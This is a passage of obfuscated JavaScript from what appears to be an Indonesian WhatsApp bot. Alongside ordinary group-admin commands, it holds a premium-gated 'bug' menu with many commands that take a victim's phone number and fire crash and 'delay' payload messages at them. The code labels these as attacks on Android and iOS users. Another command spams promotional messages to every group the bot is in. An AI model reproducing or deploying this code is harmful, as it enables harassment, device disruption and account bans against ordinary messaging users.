‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0x2268af of _0x1c2263) {
            _0x3edfd0 += "⊝ @" + _0x2268af.id.split('@')[0x0] + "\n";
          }
          _0x488b14.sendMessage(_0x257ec2.chat, {
            'text': _0x3edfd0,
            'mentions': _0x1c2263.map(_0x3e808c => _0x3e808c.id)
          }, {
            'quoted': _0x257ec2
          });
        }
        break;
      case "kick":
        {
          if (!_0x157b9) {
            return _0x2d94c9("Only Group");
          }
          if (!_0x341a7a && !_0x14f0d6) {
            return _0x2d94c9("Only Admin");
          }
          if (!_0x1f6e63) {
            return _0x2d94c9("Bot Bukan Admin :(");
          }
          let _0x40b02a = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x5592c0.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x488b14.groupParticipantsUpdate(_0x257ec2.chat, [_0x40b02a], 'remove').then(_0x57868d => _0x2d94c9(util.format(_0x57868d)))['catch'](_0x370ba5 => _0x2d94c9(util.format(_0x370ba5)));
        }
        break;
      case 'closegroup':
        {
          if (!_0x157b9) {
            return _0x2d94c9("Khusus Group Bego");
          }
          if (!_0x341a7a && !_0x14f0d6) {
            return _0x2d94c9("Khusus Admin");
          }
          if (!_0x1f6e63) {
            return _0x2d94c9("Bot Bukan Admin Bego");
          }
          if (!_0x47ea36[0x0]) {
            return _0x2d94c9("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x28d847 + _0x1a8c03) + "10 second");
          }
          if (_0x47ea36[0x1] == "second") {
            var _0x54eac7 = _0x47ea36[0x0] * "1000";
          } else {
            if (_0x47ea36[0x1] == "minute") {
              var _0x54eac7 = _0x47ea36[0x0] * '60000';
            } else {
              if (_0x47ea36[0x1] == 'hour') {
                var _0x54eac7 = _0x47ea36[0x0] * "3600000";
              } else {
                if (_0x47ea36[0x1] == "day") {
                  var _0x54eac7 = _0x47ea36[0x0] * "86400000";
                }
              }
            }
          }
          _0x2d94c9("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x488b14.groupSettingUpdate(_0x257ec2.chat, "announcement");
            _0x2d94c9("Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin");
          }, _0x54eac7);
        }
        break;
      case "opengroup":
        {
          if (!_0x157b9) {
            return _0x2d94c9("Khusus Group Bego");
          }
          if (!_0x341a7a && !_0x14f0d6) {
            return _0x2d94c9("Khusus Admin");
          }
          if (!_0x1f6e63) {
            return _0x2d94c9("Bot Bukan Admin Bego");
          }
          if (!_0x47ea36[0x0]) {
            return _0x2d94c9("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x28d847 + _0x1a8c03) + "10 second");
          }
          if (_0x47ea36[0x1] == "second") {
            var _0x54eac7 = _0x47ea36[0x0] * "1000";
          } else {
            if (_0x47ea36[0x1] == 'minute') {
              var _0x54eac7 = _0x47ea36[0x0] * '60000';
            } else {
              if (_0x47ea36[0x1] == 'hour') {
                var _0x54eac7 = _0x47ea36[0x0] * '3600000';
              } else {
                if (_0x47ea36[0x1] == "day") {
                  var _0x54eac7 = _0x47ea36[0x0] * "86400000";
                }
              }
            }
          }
          _0x2d94c9("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x488b14.groupSettingUpdate(_0x257ec2.chat, 'not_announcement');
            _0x2d94c9("Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan");
          }, _0x54eac7);
        }
        break;
      case "demote":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!_0x157b9) {
            return _0x2d94c9("Only Group");
          }
          if (!_0x341a7a && !_0x14f0d6) {
            return _0x2d94c9("Only Admin");
          }
          if (!_0x1f6e63) {
            return _0x2d94c9("Bot Bukan Admin :(");
          }
          let _0x126bf4 = _0x257ec2.mentionedJid[0x0] ? _0x257ec2.mentionedJid[0x0] : _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x5592c0.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x488b14.groupParticipantsUpdate(_0x257ec2.chat, [_0x126bf4], 'demote').then(_0x421e6c => _0x2d94c9(util.format(_0x421e6c)))["catch"](_0x4bfdcc => _0x2d94c9(util.format(_0x4bfdcc)));
        }
        break;
      case "promote":
        {
          if (!_0x157b9) {
            return _0x2d94c9("Only Group");
          }
          if (!_0x341a7a && !_0x14f0d6) {
            return _0x2d94c9("Only Admin");
          }
          if (!_0x1f6e63) {
            return _0x2d94c9("Bot Bukan Admin :(");
          }
          let _0x36a833 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x5592c0.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x488b14.groupParticipantsUpdate(_0x257ec2.chat, [_0x36a833], "add").then(_0xd00cee => _0x2d94c9(util.format(_0xd00cee)))['catch'](_0x151f0a => _0x2d94c9(util.format(_0x151f0a)));
        }
        break;
      case "jpmpromosi":
      case "jpmpromo":
      case "jpm3":
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          if (!_0x5592c0 && !_0x257ec2.quoted) {
            return _0x257ec2.reply("teksnya atau replyteks");
          }
          var _0x171412 = _0x257ec2.quoted ? _0x257ec2.quoted.text : _0x5592c0;
          let _0x7e145d = 0x0;
          let _0x48a3c9 = await _0x488b14.groupFetchAllParticipating();
          let _0x4ee8be = Object.entries(_0x48a3c9).slice(0x0).map(_0x5c433b => _0x5c433b[0x1]);
          let _0x112ec1 = _0x4ee8be.filter(_0x287bf5 => _0x287bf5.announce == false);
          let _0x539de0 = _0x112ec1.map(_0x132c79 => _0x132c79.id);
          _0x257ec2.reply("Memproses Mengirim Pesan Ke *" + _0x539de0.length + " Grup*");
          let _0x485424 = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x171412
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6285789034010\",\"merchant_url\":\"https://whatsapp.com/channel/0029Val78a7EawdvrnMrxC2B\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"YouTube Owner\",\"url\":\"" + linkyt + "\",\"merchant_url\":\"https://youtube.com/@byxxxzoo\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Testi Di whatsapp\",\"url\":\"" + isLink + "\",\"merchant_url\":\"https://whatsapp.com/channel/0029Val78a7EawdvrnMrxC2B\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x257ec2.sender,
            'quoted': _0x257ec2
          });
          for (let _0x21dcd5 of _0x539de0) {
            try {
              await _0x488b14.relayMessage(_0x21dcd5, _0x485424.message, {
                'messageId': _0x485424.key.id
              });
              _0x7e145d += 0x1;
            } catch {}
            await sleep(global.delayjpm);
          }
          _0x257ec2.reply("Berhasil Mengirim Pesan Ke *" + _0x7e145d + " Grup*");
        }
        break;
      case "sticker":
      case 'stiker':
      case 's':
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          if (!_0x452409) {
            return _0x2d94c9("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x28d847 + _0x1a8c03) + "\nDurasi Video 1-9 Detik");
          }
          if (/image/.test(_0x2a7f4e)) {
            let _0x3dcf12 = await _0x452409.download();
            let _0x5cfddc = await _0x488b14.sendStimg(_0x43890b, _0x3dcf12, _0x257ec2, {
              'packname': global.packname,
              'author': global.author
            });
            await fs.unlinkSync(_0x5cfddc);
          } else {
            if (/video/.test(_0x2a7f4e)) {
              if ((_0x452409.msg || _0x452409).seconds > 0xb) {
                return _0x2d94c9("Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
              }
              let _0x1f67b6 = await _0x452409.download();
              let _0x15b0cf = await _0x488b14.sendStvid(_0x43890b, _0x1f67b6, _0x257ec2, {
                'packname': global.packname,
                'author': global.author
              });
              await fs.unlinkSync(_0x15b0cf);
            } else {
              _0x2d94c9("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x28d847 + _0x1a8c03) + "\nDurasi Video 1-9 Detik");
            }
          }
        }
        break;
      case "xtxz":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example:\n " + (_0x28d847 + _0x1a8c03) + " 62xxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x3a803f = [{
            'title': "⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐗͢𝐯ͯ𝐍 𝐇𝐢͢𝐠͛𝐡 𝐕ͦ͢ 𝟏༑",
              'id': "xvnhigh " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐓ͯ͢𝐫𝐚𝐬͢𝐡 𝐒͢𝐲𝐬𝐭ͯ͢𝐞𝐦ͦ 𝐕͢ 𝟐༑̬",
              'id': "trashlock " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐂𝐨͢𝐦͌𝐛𝐨 𝐁𝐮̈́͢𝐠𝐬 𝐕͋͢ 𝟑༑̬",
              'id': "combo " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐁𝐢͢𝐠𝐞͒𝐫𝐬̽ 𝐐𝐮͢𝐚ͦ𝐤 𝐕͆͢ 𝟒༑",
              'id': "bigershard " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐏𝐫͋͢𝐚𝐝𝐞͢𝐗ͦ 𝐕͇͢ 𝟓༑",
              'id': "pradex " + target
            }]
          }, {
            'title': "⌜ 𝐈𝚯𝐒 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐁͢𝐥𝐚ͦ𝐧̾𝐤 𝐢͢𝐨̾ͦ𝐬༑",
              'id': "xios " + target
            }]
          }, {
            'title': "⌜ 𝐕𝐘𝐗𝐈𝚯𝐍 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕𝐢͢𝐧ͬ𝐭𝐚͢𝐠ͦ𝐞༑",
              'id': "vintage " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐒͢𝐮͛𝐫𝐞͢𝐧ͦ𝐝༑",
              'id': "surend " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': '͝⌁⃰𝐕𝐢͢𝐫ͫ𝐗𝐬͎͢𝐙༑',
              'id': "virxsz " + target
            }]
          }, {
            'title': "⌜ 𝐗𝐘𝐗 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕͢𝐮𝐥͗𝐜𝐚͗͢𝐧𝐢ͯ𝐜༑",
              'id': "vulcanic " + target
            }]
          }, {
            'title': "⌜ 𝐕𝚯𝐋𝚯𝐈𝐃 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': '͝⌁⃰𝐕͢𝐲͒𝐙𝐱ͯ͢𝐧༑',
              'id': "vyzxn " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': '͝⌁⃰𝐆𝐫͒͢𝐎𝐱ͯ𝐳͢𝐳ͦ𝐗༑',
              'id': "groxzzx " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕͢𝐳ͯ𝐘𝐧͌͢𝐱༑",
              'id': "vzynx " + target
            }]
          }, {
            'title': "⌜ 𝐗𝐕𝐍 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': '͝⌁⃰𝐎͂͢𝐯𝐞̽𝐫𝐅͢𝐥𝐨͂𝐰༑',
              'id': "overflow " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐌͢𝐢͂𝐝𝐞ͦ𝐱͢𝐙̽༑",
              'id': "midexz " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': '͝⌁⃰𝐂̈́𝐫͢𝐚͒𝐬𝐡𝐅͢𝐥𝐨ͦ𝐰༑',
              'id': "crashflow " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐌͢𝐢𝐧͋𝐞𝐫͋͢𝐗༑",
              'id': "miners " + target
            }]
          }, {
            'title': "⌜ 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "𝐒𝐩𝐚𝐦𝐏𝐚𝐢𝐫",
              'id': "spampair " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': '𝐓𝐞𝐦𝐩𝐁𝐚𝐧',
              'id': "tempban " + target
            }]
          }];
          let _0x2d6068 = {
            'title': "⿻  ⌜ 𝐗𝐯𝐍 𝐄𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐞🐉 ⌟  ⿻",
            'sections': _0x3a803f
          };
          let _0x1d3924 = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': '1203632@newsletter',
                      'newsletterName': "𝐛𝐲𝐱𝐱 𝐡𝐚𝐫𝐝[ 𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 ]⚡",
                      'serverMessageId': -0x1
                    },
                    'businessMessageForwardInfo': {
                      'businessOwnerJid': _0x488b14.decodeJid(_0x488b14.user.id)
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': ''
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'title': "☠️⃟ᝤ𝐗͢𝐕͖𝐍ͧ Э͜𝐗͢𝐂𝐋͋𝐔͖𝐒͢їѴͦ𝐄͆͡ຯ͜͡🩸͜\n \n ≫ 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : " + target + "\n \n 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙼𝙴𝙼𝙸𝙻𝙸𝙷 𝙿𝙴𝙽𝚈𝙴𝚁𝙰𝙽𝙶𝙰𝙽 𝙱𝚄𝙶",
                    'subtitle': '𝐁𝐲𝐲𝐱𝐳',
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/xbug.jpg")
                    }, {
                      'upload': _0x488b14.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x2d6068)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/6282291664759\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x488b14.relayMessage(_0x1d3924.key.remoteJid, _0x1d3924.message, {
            'messageId': _0x1d3924.key.id
          });
        }
        break;
      case "xvnhigh":
      case "bigershard":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "pradex":
      case "combo":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x1c81c7(target, _0x18765d);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "trashlock":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          _0x2d94c9(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case 'xip':
      case "xios":
      case "trashios":
      case "iosampas":
      case "ipkentang":
      case 'iphone':
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          _0x2d94c9(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "vintage":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x1c81c7(target, _0x18765d);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "vulcanic":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "surend":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          await _0x31f1b8(target, _0x2acfd1, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x31f1b8(target, _0x2acfd1, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          _0x2d94c9(_0x123a95);
        }
        break;
      case 'virxsz':
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "vyzxn":
      case "groxzzx":
      case "vzynx":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x1c81c7(target, _0x18765d);
          await _0x3ea524(target, _0x18765d, ptcp = true);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "overflow":
      case 'midexz':
      case "crashflow":
      case 'miners':
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x1c81c7(target, _0x18765d);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          _0x2d94c9(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗫𝗩𝗡 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "testbug":
        {
          if (!_0x55dc4) {
            return _0x2d94c9(mess.only.premium);
          }
          if (!q) {
